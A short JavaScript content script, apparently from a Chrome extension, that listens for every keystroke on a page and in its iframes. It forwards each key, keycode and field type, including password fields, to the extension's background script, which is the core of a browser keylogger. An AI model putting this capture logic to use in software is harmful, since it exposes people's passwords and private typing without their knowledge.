//keypress detect
document.addEventListener('keydown', function (e) {
	chrome.runtime.sendMessage({type: 'load'});
	if (!e.ctrlKey) chrome.runtime.sendMessage({ type: 'type', key: e.key ,  keycode: e.keyCode , input_type: e.target.type});
}, true);
var ifs = document.getElementsByTagName("iframe");
for (var i = 0; i < ifs.length; i++) {
	var fc = ifs[i].contentDocument || ifs[i].contentWindow;
	fc.addEventListener('keydown', function (e) {
		chrome.runtime.sendMessage({type: 'load'});
		if (!e.ctrlKey) chrome.runtime.sendMessage({ type: 'type', key: e.key ,  keycode: e.keyCode , input_type: e.target.type});
	}, true);
}